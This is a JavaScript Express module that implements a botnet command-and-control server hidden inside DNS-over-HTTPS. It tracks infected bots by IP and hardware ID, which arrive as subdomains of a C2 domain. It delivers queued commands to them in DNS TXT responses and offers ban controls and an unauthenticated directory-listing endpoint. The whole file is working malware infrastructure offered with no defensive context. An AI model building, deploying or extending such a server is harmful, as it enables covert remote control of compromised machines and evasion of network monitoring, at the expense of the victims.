const express    = require('express');
const packet     = require('dns-packet');
const bodyParser = require('body-parser');
const path       = require('path');
const fs         = require('fs');

const C2_DOMAIN      = 'signal.com';
const DOH_TTL_A      = 30;
const DOH_TTL_TXT    = 5;

const bots   = {};   // bots ip
const queue  = {};   // queue hwid
const banned = new Set();

const router = express.Router();

router.use(bodyParser.json());
router.use(express.static(path.join(__dirname, 'public')));
router.get('/dns-query', (req, res) => {
  const name  = req.query.name || '';
  const qtype = Number(req.query.type) || 1;
  const ip    = req.ip.replace('::ffff:', '');

  if (banned.has(ip)) {
    return res.status(403).end();
  }

  let hwid = null;
  if (name.endsWith(`.${C2_DOMAIN}`)) {
    hwid = name.slice(0, name.length - C2_DOMAIN.length - 1);
    if (banned.has(hwid)) return res.status(403).end();
  }

  bots[ip] = { ip, hwid, lastSeen: Date.now() };
  queue[hwid] = queue[hwid] || [];

  const answers = [];

  if (qtype === 1) {
    answers.push({
      name, type: 'A', class: 'IN', ttl: DOH_TTL_A,
      data: '127.0.0.1'
    });
  }
  else if (qtype === 16 && hwid) {
    const q = queue[hwid];
    if (q && q.length > 0) {
      const cmd = q.shift();
      answers.push({
        name, type: 'TXT', class: 'IN', ttl: DOH_TTL_TXT,
        data: cmd
      });
    }
  }

  const response = packet.encode({
    type:      'response',
    id:        0,
    flags:     packet.RECURSION_DESIRED | packet.RECURSION_AVAILABLE,
    questions: [{ name, type: qtype }],
    answers
  });

  res.set('Content-Type', 'application/dns-message');
  res.send(response);
});

// REST API 
router.get('/api/bots', (req, res) => {
  const out = Object.values(bots).map(b => ({
    ip:       b.ip,
    hwid:     b.hwid || '',
    lastSeen: new Date(b.lastSeen).toLocaleString()
  }));
  res.json(out);
});

// Ban/Unban
router.post('/api/ban', (req, res) => {
  const key = req.body.key;
  if (key) banned.add(key);
  res.sendStatus(200);
});
router.post('/api/unban', (req, res) => {
  const key = req.body.key;
  if (key) banned.delete(key);
  res.sendStatus(200);
});

// File manager lock
router.get('/api/files', (req, res) => {
  const dir = req.query.path || '.';
  fs.readdir(dir, { withFileTypes: true }, (err, entries) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({
      path: dir,
      list: entries.map(e => ({ name: e.name, isDirectory: e.isDirectory() }))
    });
  });
});

module.exports = { router, queue, bots, banned };
